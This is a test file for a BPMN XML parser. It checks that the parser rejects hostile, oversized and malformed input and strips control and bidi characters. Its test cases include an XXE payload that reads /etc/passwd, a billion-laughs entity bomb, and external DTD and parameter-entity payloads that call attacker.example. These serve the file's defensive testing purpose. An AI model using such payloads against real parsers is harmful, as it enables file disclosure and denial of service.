// Hostile, oversized and malformed input (CONCEPT §3, §6): rejected before
// or while parsing, always with a typed BpmnInputError; control and bidi
// characters never reach a fact.
import { readFile, readdir } from 'node:fs/promises';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { describe, expect, it } from 'vitest';

import { BpmnInputError, DEFAULT_PARSE_LIMITS, assertSafeXml, extractFacts } from '../src/index.ts';
import type { BpmnInputErrorCode, ExtractOptions, ExtractResult } from '../src/index.ts';

import {
  BPMN_NS,
  MODEL_KEY,
  definitions,
  extract,
  factOf,
  model,
  process,
} from './support/bpmn.ts';

const PROLOG = '<?xml version="1.0" encoding="UTF-8"?>';

async function rejection(
  xml: string | Uint8Array,
  opts: Partial<ExtractOptions> = {},
): Promise<BpmnInputError> {
  try {
    await extractFacts(xml, { modelKey: MODEL_KEY, ...opts });
  } catch (err) {
    expect(err).toBeInstanceOf(BpmnInputError);
    return err as BpmnInputError;
  }
  throw new Error('expected a BpmnInputError');
}

async function expectRejected(
  xml: string | Uint8Array,
  code: BpmnInputErrorCode,
  opts: Partial<ExtractOptions> = {},
): Promise<BpmnInputError> {
  const err = await rejection(xml, opts);
  expect(err.code, err.message).toBe(code);
  expect(err.name).toBe('BpmnInputError');
  return err;
}

describe('DOCTYPE and ENTITY', () => {
  const xxe = `${PROLOG}
<!DOCTYPE definitions [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<bpmn:definitions xmlns:bpmn="${BPMN_NS}" id="D"><bpmn:process id="P" name="&xxe;" /></bpmn:definitions>`;

  const billionLaughs = `${PROLOG}
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  ${Array.from({ length: 9 }, (_, i) => `<!ENTITY lol${i + 1} "${`&lol${i === 0 ? '' : i};`.repeat(10)}">`).join('\n  ')}
]>
<bpmn:definitions xmlns:bpmn="${BPMN_NS}" id="D"><bpmn:process id="P" name="&lol9;" /></bpmn:definitions>`;

  const cases: Array<[string, string, BpmnInputErrorCode]> = [
    ['XXE with an external file entity', xxe, 'doctype-forbidden'],
    ['billion laughs (entity expansion)', billionLaughs, 'doctype-forbidden'],
    [
      'external DTD',
      `${PROLOG}<!DOCTYPE definitions SYSTEM "http://attacker.example/evil.dtd"><bpmn:definitions xmlns:bpmn="${BPMN_NS}" />`,
      'doctype-forbidden',
    ],
    [
      'parameter entities',
      `<!DOCTYPE d [<!ENTITY % remote SYSTEM "http://attacker.example/x">%remote;]><bpmn:definitions xmlns:bpmn="${BPMN_NS}" />`,
      'doctype-forbidden',
    ],
    [
      'lower-case doctype',
      `<!doctype definitions><bpmn:definitions xmlns:bpmn="${BPMN_NS}" />`,
      'doctype-forbidden',
    ],
    [
      'DOCTYPE inside a comment (rejected conservatively)',
      `<!-- <!DOCTYPE x> --><bpmn:definitions xmlns:bpmn="${BPMN_NS}" />`,
      'doctype-forbidden',
    ],
    [
      'a stray ENTITY declaration',
      `<bpmn:definitions xmlns:bpmn="${BPMN_NS}"><!ENTITY x "y"></bpmn:definitions>`,
      'entity-forbidden',
    ],
  ];

  it.each(cases)('rejects %s', async (_name, xml, code) => {
    await expectRejected(xml, code);
    expect(() => assertSafeXml(xml)).toThrow(BpmnInputError);
  });

  it('rejects DOCTYPE in UTF-8 bytes with BOM', async () => {
    const bytes = Uint8Array.from([0xef, 0xbb, 0xbf, ...new TextEncoder().encode(xxe)]);
    await expectRejected(bytes, 'doctype-forbidden');
  });

  it('rejects billion laughs without expanding anything', async () => {
    const started = performance.now();
    await expectRejected(billionLaughs, 'doctype-forbidden');
    expect(performance.now() - started).toBeLessThan(1000);
  });
});

describe('size limit (5 MB per file)', () => {
  const max = DEFAULT_PARSE_LIMITS.maxBytes;

  it('is 5 MiB with 50,000 elements by default', () => {
    expect(DEFAULT_PARSE_LIMITS).toEqual({ maxBytes: 5 * 1024 * 1024, maxElements: 50_000 });
    expect(Object.isFrozen(DEFAULT_PARSE_LIMITS)).toBe(true);
  });

  it('accepts exactly the limit and rejects one byte more (string)', async () => {
    const atLimit = '<a/>'.padEnd(max, ' ');
    expect(assertSafeXml(atLimit)).toBe(atLimit);
    expect(() => assertSafeXml(`${atLimit} `)).toThrow(
      expect.objectContaining({ code: 'too-large' }),
    );
    await expectRejected(model('c7', '<bpmn:task id="T" />').padEnd(max + 1, ' '), 'too-large');
  });

  it('counts UTF-8 bytes, not characters', () => {
    const umlauts = 'ä'.repeat(max / 2 + 1); // fewer characters than the limit, more bytes
    expect(umlauts.length).toBeLessThan(max);
    expect(() => assertSafeXml(umlauts)).toThrow(expect.objectContaining({ code: 'too-large' }));
  });

  it('rejects oversized bytes before decoding them', async () => {
    await expectRejected(new Uint8Array(max + 1), 'too-large');
  });

  it('honours a lower limit', async () => {
    await expectRejected(model('c7', '<bpmn:task id="T" />'), 'too-large', {
      limits: { maxBytes: 100 },
    });
  });
});

describe('element limit (50,000 elements)', () => {
  it('rejects one element more than the default limit before parsing', async () => {
    const tasks = '<bpmn:task id="T" />'.repeat(DEFAULT_PARSE_LIMITS.maxElements);
    const xml = `<bpmn:definitions xmlns:bpmn="${BPMN_NS}" id="D"><bpmn:process id="P">${tasks}</bpmn:process></bpmn:definitions>`;
    const err = await expectRejected(xml, 'too-many-elements');
    expect(err.message).toContain('50000');
  });

  it('counts start tags only: comments, CDATA and processing instructions do not count', async () => {
    const xml = `${PROLOG}<?pi <a><b>?><bpmn:definitions xmlns:bpmn="${BPMN_NS}" id="D"><!-- <a><b><c><d> -->
      <bpmn:process id="P"><bpmn:task id="T"><bpmn:documentation><![CDATA[<x><y><z>]]></bpmn:documentation></bpmn:task></bpmn:process>
    </bpmn:definitions>`;
    // definitions, process, task, documentation
    const r = await extractFacts(xml, { modelKey: MODEL_KEY, limits: { maxElements: 4 } });
    expect(r.facts.find((f) => f.elementId === 'T')?.attrs.documentation).toBe('<x><y><z>');
    await expectRejected(xml, 'too-many-elements', { limits: { maxElements: 3 } });
  });

  it('rejects invalid limits as a programming error', async () => {
    await expect(
      extractFacts('<x/>', { modelKey: MODEL_KEY, limits: { maxElements: 0 } }),
    ).rejects.toThrow(TypeError);
    expect(() => assertSafeXml('<x/>', { maxBytes: Number.NaN })).toThrow(TypeError);
  });
});

describe('malformed input', () => {
  it.each([
    ['empty input', ''],
    ['plain text', 'garbage'],
    ['an unterminated comment', `<bpmn:definitions xmlns:bpmn="${BPMN_NS}"><!-- never closed`],
    [
      'an unterminated CDATA section',
      `<bpmn:definitions xmlns:bpmn="${BPMN_NS}"><![CDATA[ never closed`,
    ],
    ['an unterminated root tag', `<bpmn:definitions xmlns:bpmn="${BPMN_NS}"`],
    [
      'markup that cannot start a tag',
      `<bpmn:definitions xmlns:bpmn="${BPMN_NS}">< bpmn:process/></bpmn:definitions>`,
    ],
    [
      'mismatched closing tags',
      `<bpmn:definitions xmlns:bpmn="${BPMN_NS}"><bpmn:process id="P"></bpmn:definitions>`,
    ],
  ])('rejects %s as not-xml', async (_name, xml) => {
    await expectRejected(xml, 'not-xml');
  });

  it('rejects bytes that are not UTF-8', async () => {
    const latin1 = Uint8Array.from([
      ...new TextEncoder().encode(`<bpmn:definitions xmlns:bpmn="${BPMN_NS}" name="`),
      0xe4,
      0x22,
      0x2f,
      0x3e,
    ]);
    const err = await expectRejected(latin1, 'not-xml');
    expect(err.message).toContain('UTF-8');
  });

  it('rejects UTF-16', async () => {
    await expectRejected(Uint8Array.from([0xff, 0xfe, 0x3c, 0x00]), 'not-xml');
    await expectRejected(Uint8Array.from([0xfe, 0xff, 0x00, 0x3c]), 'not-xml');
  });
});

describe('not BPMN', () => {
  it.each([
    ['a foreign root element', '<foo/>'],
    ['definitions of another namespace', '<x:definitions xmlns:x="urn:other" />'],
    ['definitions without namespace', '<definitions><process id="P" /></definitions>'],
    ['a BPMN element other than definitions', `<bpmn:process xmlns:bpmn="${BPMN_NS}" id="P" />`],
  ])('rejects %s', async (_name, xml) => {
    await expectRejected(xml, 'not-bpmn');
  });
});

describe('model key', () => {
  it.each(['', 'Billing/Dunning', 'a//b', '/a', 'a/', 'a b', 'a#b'])(
    'rejects %j',
    async (modelKey) => {
      await expectRejected(model('c7', ''), 'invalid-model-key', { modelKey });
    },
  );
});

/** Control characters and bidi formatting characters (the documentation's `\n` is removed first). */
const UNSAFE = /[\p{Cc}\u061C\u200E\u200F\u202A-\u202E\u2066-\u2069]/u;

/** Every string anywhere in `value` (keys included), with its path. */
function strings(value: unknown, at = '$'): Array<[string, string]> {
  if (typeof value === 'string') return [[at, value]];
  if (Array.isArray(value)) return value.flatMap((v, i) => strings(v, `${at}[${i}]`));
  if (typeof value === 'object' && value !== null) {
    return Object.entries(value).flatMap(([k, v]) => [
      [`${at}.<key>`, k] as [string, string],
      ...strings(v, `${at}.${k}`),
    ]);
  }
  return [];
}

function expectNoUnsafeCharacters(result: ExtractResult): void {
  const unsafe = strings(result).filter(([, s]) => UNSAFE.test(s.replaceAll('\n', '')));
  expect(unsafe).toEqual([]);
}

/** NUL, a right-to-left override and SOH, as XML character references. */
const JUNK = '&#0;&#x202E;&#1;';

describe('control and bidi characters in attribute values', () => {
  it('strips them from C7 call attributes (binding, version, version tag, tenant)', async () => {
    const result = await extract(
      model(
        'c7',
        `<bpmn:callActivity id="Call_1" name="Rechnung${JUNK}" calledElement="Process_Billing${JUNK}"
           camunda:calledElementBinding="version${JUNK}" camunda:calledElementVersion="1${JUNK}2"
           camunda:calledElementVersionTag="${JUNK}" camunda:calledElementTenantId="t${JUNK}x" />`,
      ),
    );
    const call = factOf(result, 'call', 'Call_1');
    expect(call.label).toBe('Rechnung');
    expect(call.keyRaw).toBe('Process_Billing');
    expect(call.attrs).toMatchObject({ binding: 'version', version: '12', tenantId: 'tx' });
    expect(call.attrs).not.toHaveProperty('versionTag');
    expect(result.warnings).toEqual([]);
    expectNoUnsafeCharacters(result);
  });

  it('strips them from a C8 correlation key and binding type', async () => {
    const result = await extract(
      definitions(
        'c8',
        `${process(`<bpmn:receiveTask id="Receive_1" messageRef="Message_1" />
           <bpmn:callActivity id="Call_1"><bpmn:extensionElements>
             <zeebe:calledElement processId="billing${JUNK}" bindingType="deployment${JUNK}" versionTag="v1${JUNK}" />
           </bpmn:extensionElements></bpmn:callActivity>`)}
         <bpmn:message id="Message_1" name="Zahlung${JUNK}"><bpmn:extensionElements>
           <zeebe:subscription correlationKey="=order${JUNK}.id" />
         </bpmn:extensionElements></bpmn:message>`,
      ),
    );
    expect(factOf(result, 'msg_catch', 'Receive_1').attrs).toMatchObject({
      messageName: 'Zahlung',
      correlationKey: '=order.id',
    });
    expect(factOf(result, 'call', 'Call_1')).toMatchObject({
      keyRaw: 'billing',
      attrs: { binding: 'deployment', versionTag: 'v1' },
    });
    expectNoUnsafeCharacters(result);
  });

  it('treats a name of nothing but control characters as missing', async () => {
    const result = await extract(
      model(
        'c7',
        `<bpmn:intermediateThrowEvent id="Throw_1" name="Zahlung eingegangen">
           <bpmn:messageEventDefinition messageRef="Message_1" />
         </bpmn:intermediateThrowEvent>`,
        `<bpmn:message id="Message_1" name="${JUNK}" />`,
      ),
    );
    const fact = factOf(result, 'msg_throw', 'Throw_1');
    expect(fact.keyRaw).toBe('Zahlung eingegangen');
    expect(fact.attrs).not.toHaveProperty('messageName');
  });

  const CORPUS_DIR = fileURLToPath(new URL('../../../eval/corpus/', import.meta.url));
  /** Free-text attributes that end up in labels, keys or attrs. */
  const TEXT_ATTRIBUTE =
    /(\s(?:name|calledElement|camunda:calledElement\w*|processId|bindingType|versionTag|correlationKey)=")([^"]*)"/g;

  it('extracts every corpus model with junk in every text attribute exactly like the clean model', async () => {
    const files: string[] = [];
    for (const landscape of ['_sample', 'nordwind-handel', 'stadtwerke-auental']) {
      const dir = path.join(CORPUS_DIR, landscape, 'models');
      for (const entry of await readdir(dir, { recursive: true })) {
        if (entry.endsWith('.bpmn')) files.push(path.join(dir, entry));
      }
    }
    expect(files.length).toBeGreaterThan(50);
    for (const file of files) {
      const xml = await readFile(file, 'utf8');
      const dirty = xml.replace(TEXT_ATTRIBUTE, `$1$2${JUNK}"`);
      expect(dirty, file).not.toBe(xml);
      const clean = await extractFacts(xml, { modelKey: MODEL_KEY });
      const result = await extractFacts(dirty, { modelKey: MODEL_KEY });
      expectNoUnsafeCharacters(result);
      expect(result.facts, file).toEqual(clean.facts);
      expect(result.processes, file).toEqual(clean.processes);
      expect(result.messageFlows, file).toEqual(clean.messageFlows);
    }
  });
});
